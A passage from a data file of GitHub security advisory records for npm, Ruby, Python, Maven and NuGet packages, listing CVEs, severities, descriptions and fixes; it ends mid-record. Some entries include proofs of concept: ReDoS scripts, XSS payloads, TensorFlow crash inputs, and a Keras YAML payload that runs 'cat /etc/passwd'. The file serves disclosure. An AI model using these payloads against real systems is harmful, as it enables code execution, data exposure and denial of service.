1665,27604,rails-html-sanitizer,GHSA-59c7-4xj2-hgvw,CVE-2015-7578,https://github.com/advisories/GHSA-59c7-4xj2-hgvw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via crafted tag attributes.,rubygems
1666,27604,rails-html-sanitizer,GHSA-r9c2-cr39-c8g6,CVE-2015-7579,https://github.com/advisories/GHSA-r9c2-cr39-c8g6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem 1.0.2 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via an HTML entity that is mishandled by the Rails::Html::FullSanitizer class.,rubygems
1667,27604,rails-html-sanitizer,GHSA-ghqm-pgxj-37gq,CVE-2015-7580,https://github.com/advisories/GHSA-ghqm-pgxj-37gq,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,Cross-site scripting (XSS) vulnerability in lib/rails/html/scrubbers.rb in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via a crafted CDATA node.,rubygems
1668,16565,ms,GHSA-3fx5-fwvr-xrjg,CVE-2015-8315,https://github.com/advisories/GHSA-3fx5-fwvr-xrjg,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in ms,"Versions of `ms` prior to 0.7.1 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.

## Proof of Concept
```javascript
var ms = require('ms');
var genstr = function (len, chr) {
   var result = """";
   for (i=0; i<=len; i++) {
       result = result + chr;
   }

   return result;
}

ms(genstr(process.argv[2], ""5"") + "" minutea"");

```

### Results
Showing increase in execution time based on the input string.
```
$ time node ms.js 10000

real	0m0.758s
user	0m0.724s
sys	0m0.031s

$ time node ms.js 20000

real	0m2.580s
user	0m2.494s
sys	0m0.047s

$ time node ms.js 30000

real	0m5.747s
user	0m5.483s
sys	0m0.080s

$ time node ms.js 80000

real	0m41.022s
user	0m38.894s
sys	0m0.529s
```
",npm
1669,16065,marked,GHSA-hjcp-j389-59ff,CVE-2015-8854,https://github.com/advisories/GHSA-hjcp-j389-59ff,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in marked,"Versions 0.3.3 and earlier of `marked` are affected by a regular expression denial of service ( ReDoS ) vulnerability when passed inputs that reach the `em` inline rule.



## Recommendation

Update to version 0.3.4 or later.",npm
1670,18809,semver,GHSA-x6fg-f45m-jf5q,CVE-2015-8855,https://github.com/advisories/GHSA-x6fg-f45m-jf5q,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in semver,"Versions 4.3.1 and earlier of `semver` are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.



## Recommendation

Update to version 4.3.2 or later",npm
1671,17299,serve-index,GHSA-v633-x5vv-hqwc,CVE-2015-8856,https://github.com/advisories/GHSA-v633-x5vv-hqwc,moderate,2017-10-24 18:33:36 UTC,Cross-Site Scripting in serve-index,"Versions 1.6.2 and earlier of `serve-index` are affected by a cross-site scripting vulnerability. Because file and directory names are not escaped in the module's HTML output, a remote attacker that can influence file or directory names can launch a persistent cross-site scripting attack on the application.


## Recommendation

Update to version 1.6.3 or later.",npm
1672,15900,uglify-js,GHSA-34r7-q49f-h37c,CVE-2015-8857,https://github.com/advisories/GHSA-34r7-q49f-h37c,critical,2017-10-24 18:33:36 UTC,Incorrect Handling of Non-Boolean Comparisons During Minification in uglify-js,"Versions of `uglify-js` prior to 2.4.24 are affected by a vulnerability which may cause crafted JavaScript to have altered functionality after minification.

## Recommendation

Upgrade UglifyJS to version >= 2.4.24.",npm
1673,15900,uglify-js,GHSA-c9f4-xj24-8jqx,CVE-2015-8858,https://github.com/advisories/GHSA-c9f4-xj24-8jqx,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in uglify-js,"Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.


### Proof of Concept

```
var u = require('uglify-js');
var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}

u.parse(""var a = "" + genstr(process.argv[2], ""1"") + "".1ee7;"");
```

### Results
```
$ time node test.js 10000
real	0m1.091s
user	0m1.047s
sys	0m0.039s

$ time node test.js 80000
real	0m6.486s
user	0m6.229s
sys	0m0.094s
```


## Recommendation

Update to version 2.6.0 or later.",npm
1674,17093,send,GHSA-jgqf-hwc5-hh37,CVE-2015-8859,https://github.com/advisories/GHSA-jgqf-hwc5-hh37,moderate,2017-10-24 18:33:36 UTC,Root Path Disclosure in send,"Versions of `send` prior to 0.11.2 are affected by an information leakage vulnerability which may allow an attacker to enumerate paths on the server filesystem.



## Recommendation

Update to version 0.11.1 or later.",npm
1675,16466,tar,GHSA-gfjr-3jmm-4g9v,CVE-2015-8860,https://github.com/advisories/GHSA-gfjr-3jmm-4g9v,high,2017-10-24 18:33:36 UTC,Symlink Arbitrary File Overwrite in tar,"Versions of `tar` prior to 2.0.0 are affected by an arbitrary file write vulnerability. The vulnerability occurs because `tar` does not verify that extracted symbolic links to not resolve to targets outside of the extraction root directory.



## Recommendation

Update to version 2.0.0 or later",npm
1676,16013,handlebars,GHSA-fmr4-7g9q-7hc7,,https://github.com/advisories/GHSA-fmr4-7g9q-7hc7,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects handlebars,**Withdrawn:** Duplicate of GHSA-9prh-257w-9277,npm
1677,16290,mustache,GHSA-w3w8-37jv-2c58,CVE-2015-8862,https://github.com/advisories/GHSA-w3w8-37jv-2c58,high,2017-10-24 18:33:36 UTC,Cross-Site Scripting in mustache,"Versions of `mustache` prior to 2.2.1 are affected by a cross-site scripting vulnerability when attributes in mustache templates are not quoted.



### Example
Template:
```<a href={{foo}}/>```

Input:
```{ 'foo' : 'test.com onload=alert(1)'}```

Rendered result:
```<a href=test.com onload=alert(1)/>```


## Recommendation

Update to version 2.2.1 or later.
Alternatively, ensure that all attributes in hmustache templates are encapsulated with quotes.",npm
1678,18937,mail,GHSA-q86f-fmqf-qrf6,CVE-2015-9097,https://github.com/advisories/GHSA-q86f-fmqf-qrf6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects mail,"The mail gem before 2.5.5 for Ruby (aka A Really Ruby Mail Library) is vulnerable to SMTP command injection via CRLF sequences in a RCPT TO or MAIL FROM command, as demonstrated by CRLF sequences immediately before and after a DATA substring.",rubygems
1679,19199,archive-tar-minitar,GHSA-h5g2-38x9-4gv3,CVE-2016-10173,https://github.com/advisories/GHSA-h5g2-38x9-4gv3,high,2017-10-24 18:33:35 UTC,High severity vulnerability that affects archive-tar-minitar and minitar,Directory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.,rubygems
1680,16343,electron,GHSA-gvcj-pfq2-wxj7,CVE-2016-1202,https://github.com/advisories/GHSA-gvcj-pfq2-wxj7,high,2017-10-24 18:33:35 UTC,High severity vulnerability that affects electron,Untrusted search path vulnerability in Atom Electron before 0.33.5 allows local users to gain privileges via a Trojan horse Node.js module in a parent directory of a directory named on a require line.,npm
1681,15847,moment,GHSA-87vv-r9j6-g5qv,CVE-2016-4055,https://github.com/advisories/GHSA-87vv-r9j6-g5qv,moderate,2017-10-24 18:33:35 UTC,Regular Expression Denial of Service in moment,"Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.


## Proof of concept
```
var moment = require('moment');

var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=20000;i<=10000000;i=i+10000) {
    console.log(""COUNT: "" + i);
    var str = '-' + genstr(i, '1')
    console.log(""LENGTH: "" + str.length);
    var start = process.hrtime();
    moment.duration(str)

    var end = process.hrtime(start);
    console.log(end);
}
```

### Results
```
$ node moment.js
COUNT: 20000
LENGTH: 20002
[ 0, 618931029 ]
COUNT: 30001
LENGTH: 30003
[ 1, 401413894 ]
COUNT: 40002
LENGTH: 40004
[ 2, 437075303 ]
COUNT: 50003
LENGTH: 50005
[ 3, 824664804 ]
COUNT: 60004
LENGTH: 60006
[ 5, 651335262 ]
```


## Recommendation

Please update to version 2.11.2 or later. ",npm
1682,27892,rack-mini-profiler,GHSA-j5hj-fhc9-g24m,CVE-2016-4442,https://github.com/advisories/GHSA-j5hj-fhc9-g24m,moderate,2017-10-24 18:33:35 UTC,Moderate severity vulnerability that affects rack-mini-profiler,The rack-mini-profiler gem before 0.10.1 for Ruby allows remote attackers to obtain sensitive information about allocated strings and objects by leveraging incorrect ordering of security checks.,rubygems
1683,19060,actionview,GHSA-pc3m-v286-2jwj,CVE-2016-6316,https://github.com/advisories/GHSA-pc3m-v286-2jwj,moderate,2017-10-24 18:33:35 UTC,Moderate severity vulnerability that affects actionview,"Cross-site scripting (XSS) vulnerability in Action View in Ruby on Rails 3.x before 3.2.22.3, 4.x before 4.2.7.1, and 5.x before 5.0.0.1 might allow remote attackers to inject arbitrary web script or HTML via text declared as ""HTML safe"" and used as attribute values in tag handlers.",rubygems
1684,26832,doorkeeper,GHSA-3m6r-39p3-jq25,CVE-2016-6582,https://github.com/advisories/GHSA-3m6r-39p3-jq25,critical,2017-10-24 18:33:35 UTC,Doorkeeper is vulnerable to replay attacks,The Doorkeeper gem before 4.2.0 for Ruby might allow remote attackers to conduct replay attacks or revoke arbitrary tokens by leveraging failure to implement the OAuth 2.0 Token Revocation specification.,rubygems
1685,17417,jquery-ui,GHSA-hpcf-8vf9-q4gj,CVE-2016-7103,https://github.com/advisories/GHSA-hpcf-8vf9-q4gj,high,2017-10-24 18:33:35 UTC,XSS in dialog closeText in jquery-ui,"Affected versions of `jquery-ui` are vulnerable to a cross-site scripting vulnerability when arbitrary user input is supplied as the value of the `closeText` parameter in the `dialog` function. 

jQuery-UI is a library for manipulating UI elements via jQuery.

Version 1.11.4 has a cross site scripting (XSS) vulnerability in the `closeText` parameter of the `dialog`  function.  If your application passes user input to this parameter, it may be vulnerable to XSS via this attack vector.


## Recommendation

Upgrade to jQuery-UI 1.12.0 or later.",npm
1686,19257,openssl,GHSA-6h88-qjpv-p32m,CVE-2016-7798,https://github.com/advisories/GHSA-6h88-qjpv-p32m,high,2017-10-24 18:33:35 UTC,OpenSSL gem for Ruby using inadequate encryption strength,"The OpenSSL gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.",rubygems
1687,34012,org.jsoup:jsoup,GHSA-m72m-mhq2-9p6c,CVE-2021-37714,https://github.com/advisories/GHSA-m72m-mhq2-9p6c,high,2021-08-23 19:42:38 UTC,Uncaught Exception in jsoup,"### Impact
_What kind of vulnerability is it? Who is impacted?_
Those using jsoup to parse untrusted HTML or XML may be vulnerable to DOS attacks. If the parser is run on user supplied input, an attacker may supply content that causes the parser to get stuck (loop indefinitely until cancelled), to complete more slowly than usual, or to throw an unexpected exception. This effect may support a denial of service attack.

### Patches
_Has the problem been patched? What versions should users upgrade to?_
Users should upgrade to jsoup 1.14.2

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_
Users may rate limit input parsing. Users should limit the size of inputs based on system resources. Users should implement thread watchdogs to cap and timeout parse runtimes.
",maven
1688,20024,notebook,GHSA-hwvq-6gjx-j797,CVE-2021-32798,https://github.com/advisories/GHSA-hwvq-6gjx-j797,critical,2021-08-23 19:40:38 UTC,Special Element Injection in notebook,"### Impact

Untrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.

### Patches

5.7.11, 6.4.1

### References

[OWASP Page on Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-rules)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.

Credit: Guillaume Jeanne from Google


### Example:

A notebook with the following content in a cell and it would display an alert when opened for the first time in Notebook (in an untrusted state):

```
{ ""cell_type"": ""code"", ""execution_count"": 0, ""metadata"": {}, ""outputs"": [ { ""data"": { ""text/html"": [ ""<select><iframe></select><img src=x: onerror=alert('xss')>\n""], ""text/plain"": [] }, ""metadata"": {}, ""output_type"": ""display_data"" } ], ""source"": [ """" ] }
````",pip
1689,20376,jupyterlab,GHSA-4952-p58q-6crx,CVE-2021-32797,https://github.com/advisories/GHSA-4952-p58q-6crx,high,2021-08-23 19:40:22 UTC,JupyterLab: XSS due to lack of sanitization of the action attribute of an html <form>,"### Impact

Untrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.

### Patches

Patched in the following versions: 3.1.4, 3.0.17, 2.3.2, 2.2.10, 1.2.21.

### References

[OWASP Page on Restricting Form Submissions](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### For more information

If you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.

Credit: Guillaume Jeanne from Google
",pip
1690,12968,Microsoft.AspNetCore.Authentication.JwtBearer,GHSA-q7cg-43mg-qp69,CVE-2021-34532,https://github.com/advisories/GHSA-q7cg-43mg-qp69,moderate,2021-08-25 14:45:28 UTC,ASP.NET Core Information Disclosure Vulnerability,"Microsoft is releasing this security advisory to provide information about a vulnerability in .NET 5.0, .NET Core 3.1 and .NET Core 2.1. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.

An information disclosure vulnerability exists in .NET 5.0, .NET Core 3.1 and .NET Core 2.1 where a JWT token is logged if it cannot be parsed.

### Patches

* If you're using .NET 5.0, you should download and install Runtime 5.0.9 or SDK 5.0.206 (for Visual Studio 2019 v16.8) or SDK 5.0.303 (for Visual Studio 2019 V16.10) from https://dotnet.microsoft.com/download/dotnet-core/5.0.

* If you're using .NET Core 3.1, you should download and install Runtime 3.1.18 or SDK 3.1.118 (for Visual Studio 2019 v16.4) or 3.1.412 (for Visual Studio 2019 v16.7 or later) from https://dotnet.microsoft.com/download/dotnet-core/3.1.

* If you're using .NET Core 2.1, you should download and install Runtime 2.1.29 or SDK 2.1.525 (for Visual Studio 2019 v15.9) or 2.1.817 from https://dotnet.microsoft.com/download/dotnet-core/2.1.

* If your application is using .NET Core 2.1 running on .NET Framework see the [Updating .NET Core 2.1 on .NET Framework](#updating-2.1) section below.

### <a name=""updating-2.1""></a> Updating .NET Core 2.1 on .NET Framework
If you are running .NET Core 2.1 on .NET Framework you need to check your projects for dependencies and update them accordingly.

#### Direct dependencies

Direct dependencies are discoverable by examining your `csproj` file. They can be fixed by [editing the project file](#fixing-direct-dependencies) or using NuGet to update the dependency.

#### Transitive dependencies

Transitive dependencies occur when you add a package to your project that in turn relies on another package. For example, if Contoso publishes a package `Contoso.Utility` which, in turn, depends on `Contoso.Internals` and you add the `Contoso.Utility` package to your project now your project has a direct dependency on `Contoso.Utility` and, because `Contoso.Utility` depends 'Contoso.Internals', your application gains a transitive dependency on the `Contoso.Internals` package.

Transitive dependencies are reviewable in two ways:

* In the Visual Studio Solution Explorer window, which supports searching.
* By examining the `project.assets.json` file contained in the obj directory of your project for `csproj` based projects

The `project.assets.json` files are the authoritative list of all packages used by your project, containing both direct and transitive dependencies.

There are two ways to view transitive dependencies. You can either [use Visual Studio’s Solution Explorer](#vs-solution-explorer), or you can review [the `project.assets.json` file](#project-assets-json)).

##### <a name=""vs-solution-explorer""></a>Using Visual Studio Solution Explorer

To use Solution Explorer, open the project in Visual Studio, and then press Ctrl+; to activate the search in Solution Explorer. Search for the [vulnerable package](#affected-software) and make a note of the version numbers of any results you find.

For example, search for `Microsoft.AspNetCore.Authentication.JwtBearer` and update the package to the latest version


##### <a name=""project-assets-json""></a> Manually reviewing project.assets.json

Open the *project.assets.json* file from your project’s obj directory in your editor. We suggest you use an editor that understands JSON and allows you to collapse and expand nodes to review this file.
Visual Studio and Visual Studio Code provide JSON friendly editing.

Search the *project.assets.json* file for the [vulnerable package](#affected-software), using the format `packagename/` for each of the package names from the preceding table. If you find the assembly name in your search:

* Examine the line on which they are found, the version number is after the `/`.
* Compare to the [vulnerable versions table](#affected-software).

For example, a search result that shows `Microsoft.AspNetCore.Authentication.JwtBearer/2.1.0` is a reference to version 2.1.1 of `Microsoft.AspNetCore.Authentication.JwtBearer`.

If your *project.assets.json* file includes references to the [vulnerable package](#affected-software), then you need to fix the transitive dependencies.

If you have not found any reference to any vulnerable packages, this means either

* None of your direct dependencies depend on any vulnerable packages, or
* You have already fixed the problem by updating the direct dependencies.

#### Other Details

- Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/195
- An Issue for this can be found at https://github.com/dotnet/aspnetcore/issues/35246
- MSRC details for this can be found at https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-34532
",nuget
1691,20741,tensorflow,GHSA-cmgw-8vpc-rc59,CVE-2021-37692,https://github.com/advisories/GHSA-cmgw-8vpc-rc59,moderate,2021-08-25 14:38:57 UTC,"Segfault on strings tensors with mistmatched dimensions, due to Go code","### Impact
Under certain conditions, Go code can trigger a segfault in string deallocation.


For string tensors, `C.TF_TString_Dealloc` is called during garbage collection within a finalizer function.  However, tensor structure isn't checked until encoding to avoid a performance penalty.  The current method for dealloc assumes that encoding succeeded, but segfaults when a string tensor is garbage collected whose encoding failed (e.g., due to mismatched dimensions).

To fix this, the call to set the finalizer function is deferred until `NewTensor` returns and, if encoding failed for a string tensor, deallocs are determined based on bytes written.

### Patches
We have patched the issue in GitHub commit [8721ba96e5760c229217b594f6d2ba332beedf22](https://github.com/tensorflow/tensorflow/commit/8721ba96e5760c229217b594f6d2ba332beedf22) (merging [#50508](https://github.com/tensorflow/tensorflow/pull/50508)).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, which is the other affected version.                                                                                                                                               

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [fixing PR](https://github.com/tensorflow/tensorflow/pull/50508).",pip
1692,20741,tensorflow,GHSA-27qf-jwm8-g7f3,CVE-2021-37691,https://github.com/advisories/GHSA-27qf-jwm8-g7f3,moderate,2021-08-25 14:39:17 UTC,FPE in LSH in TFLite,"### Impact
An attacker can craft a TFLite model that would trigger a division by zero error in LSH  [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/lsh_projection.cc#L118).

```cc
int RunningSignBit(const TfLiteTensor* input, const TfLiteTensor* weight,
                   float seed) {
  int input_item_bytes = input->bytes / SizeOfDimension(input, 0);
  // ...
}
```
          
There is no check that the first dimension of the input is non zero.
      
### Patches
We have patched the issue in GitHub commit [0575b640091680cfb70f4dd93e70658de43b94f9](https://github.com/tensorflow/tensorflow/commit/0575b640091680cfb70f4dd93e70658de43b94f9).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick thiscommit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security.",pip
1693,20741,tensorflow,GHSA-3hxh-8cp2-g4hg,CVE-2021-37690,https://github.com/advisories/GHSA-3hxh-8cp2-g4hg,moderate,2021-08-25 14:39:22 UTC,Use after free and segfault in shape inference functions,"### Impact
When running shape functions, some functions (such as `MutableHashTableShape`) produce extra output information in the form of a `ShapeAndType` struct. The shapes embedded in this struct are owned by an inference context that is cleaned up almost immediately; if the upstream code attempts to access this shape information, it can trigger a segfault.

`ShapeRefiner` is mitigating this for normal output shapes by cloning them (and thus putting the newly created shape under ownership of an inference context that will not die), but we were not doing the same for shapes and types. This commit fixes that by doing similar logic on output shapes and types.

### Patches
We have patched the issue in GitHub commit [ee119d4a498979525046fba1c3dd3f13a039fbb1](https://github.com/tensorflow/tensorflow/commit/ee119d4a498979525046fba1c3dd3f13a039fbb1).                                                                                                          

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
1694,20741,tensorflow,GHSA-mhhc-q96p-mfm9,CVE-2021-37686,https://github.com/advisories/GHSA-mhhc-q96p-mfm9,moderate,2021-08-25 14:39:58 UTC,Infinite loop in TFLite,"### Impact
The strided slice implementation in TFLite has a logic bug which can allow an attacker to trigger an infinite loop. This arises from newly introduced support for [ellipsis in axis definition](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/strided_slice.cc#L103-L122):

```cc
  for (int i = 0; i < effective_dims;) {
    if ((1 << i) & op_context->params->ellipsis_mask) {
      // ...
      int ellipsis_end_idx =
          std::min(i + 1 + num_add_axis + op_context->input_dims - begin_count,
                   effective_dims);
      // ...
      for (; i < ellipsis_end_idx; ++i) {
        // ...
      }
      continue;
    }
    // ...
    ++i;
  }
```

An attacker can craft a model such that `ellipsis_end_idx` is smaller than `i` (e.g., always negative). In this case, the inner loop does not increase `i` and the `continue` statement causes execution to skip over the preincrement at the end of the outer loop.

### Patches
We have patched the issue in GitHub commit [dfa22b348b70bb89d6d6ec0ff53973bacb4f4695](https://github.com/tensorflow/tensorflow/commit/dfa22b348b70bb89d6d6ec0ff53973bacb4f4695).

The fix will be included in TensorFlow 2.6.0. This is the only affected version.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1695,20741,tensorflow,GHSA-q7f7-544h-67h9,CVE-2021-37684,https://github.com/advisories/GHSA-q7f7-544h-67h9,moderate,2021-08-25 14:40:13 UTC,FPE in TFLite pooling operations,"### Impact
The implementations of pooling in TFLite are vulnerable to division by 0 errors as there are no checks for divisors not being 0.

### Patches 
We have patched the issue in GitHub commit [dfa22b348b70bb89d6d6ec0ff53973bacb4f4695](https://github.com/tensorflow/tensorflow/commit/dfa22b348b70bb89d6d6ec0ff53973bacb4f4695).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
1696,20741,tensorflow,GHSA-g8wg-cjwc-xhhp,CVE-2021-37679,https://github.com/advisories/GHSA-g8wg-cjwc-xhhp,high,2021-08-25 14:41:00 UTC,Heap OOB in nested `tf.map_fn` with `RaggedTensor`s,"### Impact
It is possible to nest a `tf.map_fn` within another `tf.map_fn` call. However, if the input tensor is a `RaggedTensor` and there is no function signature provided, code assumes the output is a fully specified tensor and fills output buffer with uninitialized contents from the heap:

```python
import tensorflow as tf
x = tf.ragged.constant([[1,2,3], [4,5], [6]])
t = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x)
z = tf.ragged.constant([[[1,2,3],[1,2,3],[1,2,3]],[[4,5],[4,5]],[[6]]])
```
  
The `t` and `z` outputs should be identical, however this is not the case. The last row of `t` contains data from the heap which can be used to leak other memory information.

The bug lies in the conversion from a `Variant` tensor to a `RaggedTensor`. The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/ragged_tensor_from_variant_op.cc#L177-L190) does not check that all inner shapes match and this results in the additional dimensions in the above example.

The same implementation can result in data loss, if input tensor is tweaked:

```python
import tensorflow as tf
x = tf.ragged.constant([[1,2], [3,4,5], [6]])
t = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x) 
```

Here, the output tensor will only have 2 elements for each inner dimension.

### Patches
We have patched the issue in GitHub commit [4e2565483d0ffcadc719bd44893fb7f609bb5f12](https://github.com/tensorflow/tensorflow/commit/4e2565483d0ffcadc719bd44893fb7f609bb5f12).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Haris Sahovic.",pip
1697,20741,tensorflow,GHSA-r6jx-9g48-2r5r,CVE-2021-37678,https://github.com/advisories/GHSA-r6jx-9g48-2r5r,critical,2021-08-25 14:41:12 UTC,Arbitrary code execution due to YAML deserialization,"### Impact
TensorFlow and Keras can be tricked to perform arbitrary code execution when deserializing a Keras model from YAML format.

```python
from tensorflow.keras import models

payload = '''
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: ""__import__('os').system('cat /etc/passwd')""
'''
  
models.model_from_yaml(payload)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/python/keras/saving/model_config.py#L66-L104) uses `yaml.unsafe_load` which can perform arbitrary code execution on the input.

### Patches
Given that YAML format support requires a significant amount of work, we have removed it for now.

We have patched the issue in GitHub commit [23d6383eb6c14084a8fc3bdf164043b974818012](https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Arjun Shibu.",pip
1698,20741,tensorflow,GHSA-qfpc-5pjr-mh26,CVE-2021-37677,https://github.com/advisories/GHSA-qfpc-5pjr-mh26,moderate,2021-08-25 14:41:23 UTC,Missing validation in shape inference for `Dequantize`,"### Impact
The shape inference code for `tf.raw_ops.Dequantize` has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments:

```python
import tensorflow as tf

tf.compat.v1.disable_v2_behavior()
tf.raw_ops.Dequantize(
  input_tensor = tf.constant(-10.0, dtype=tf.float32),
  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),
  min_range = tf.constant([], shape=[0], dtype=tf.float32),
  max_range = tf.constant([], shape=[0], dtype=tf.float32),
  mode  = 'MIN_COMBINED',
  narrow_range=False,
  axis=-10,
  dtype=tf.dtypes.float32)
```

The shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/array_ops.cc#L2999-L3014) uses `axis` to select between two different values for `minmax_rank` which is then used to retrieve tensor dimensions. However, code assumes that `axis` can be either `-1` or a value greater than `-1`, with no validation for the other values.

### Patches
We have patched the issue in GitHub commit [da857cfa0fde8f79ad0afdbc94e88b5d4bbec764](https://github.com/tensorflow/tensorflow/commit/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security.",pip
1699,20741,tensorflow,GHSA-v768-w7m9-2vmm,CVE-2021-37676,https://github.com/advisories/GHSA-v768-w7m9-2vmm,high,2021-08-25 14:41:26 UTC,Reference binding to nullptr in shape inference,"### Impact
An attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.SparseFillEmptyRows`:

```python
import tensorflow as tf
  
tf.compat.v1.disable_v2_behavior()
tf.raw_ops.SparseFillEmptyRows(
  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),
  values = tf.constant([], shape=[0], dtype=tf.int64),
  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),
  default_value = 0)
```
  
The shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/sparse_ops.cc#L608-L634) does not validate that the input arguments are not empty tensors.

### Patches 
We have patched the issue in GitHub commit [578e634b4f1c1c684d4b4294f9e5281b2133b3ed](https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang of Baidu Security",pip
1700,20741,tensorflow,GHSA-9c8h-2mv3-49ww,CVE-2021-37675,https://github.com/advisories/GHSA-9c8h-2mv3-49ww,moderate,2021-08-25 14:41:29 UTC,Division by 0 in most convolution operators,"### Impact
